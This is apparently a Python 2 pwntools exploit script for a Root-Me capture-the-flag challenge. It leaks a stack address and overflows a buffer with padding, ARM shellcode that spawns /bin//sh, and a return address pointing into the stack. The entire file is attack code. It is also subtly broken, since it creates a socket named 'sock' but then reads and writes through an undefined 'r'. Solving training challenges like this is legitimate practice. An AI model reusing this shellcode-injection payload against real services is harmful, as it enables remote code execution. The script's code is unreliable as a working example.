from pwn import *
from socket import socket
from telnetlib import Telnet

def receive(r):
    s = r.recvuntil('\n')
    print s

sock = socket()
sock.connect(('challenge04.root-me.org', 61045))

shell = '\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0e\x30\x01\x90\x49\x1a\x92\x1a\x08\x27\xc2\x51\x03\x37\x01\xdf\x2f\x62\x69\x6e\x2f\x2f\x73\x68'

# Get address of stack
receive(r)
r.send('a\n')
s = r.recvuntil('\n')
stackNum = int(s[:s.find(':')], 16)
stack = p32(stackNum)

offset = 164
size = len(shell)

# craft payload
shellAddress = p32(stackNum + (offset - size))
payload = 'A' * (offset - size) + shell + shellAddress

print len(payload)

# Send again
receive(r)

r.send('y')
receive(r)

print 'payload=', payload
r.sendline(payload)
receive(r)
receive(r)
receive(r)
receive(r)
receive(r)
receive(r)
receive(r)
receive(r)
receive(r)
receive(r)
receive(r)
receive(r)

r.sendline('n')
receive(r)
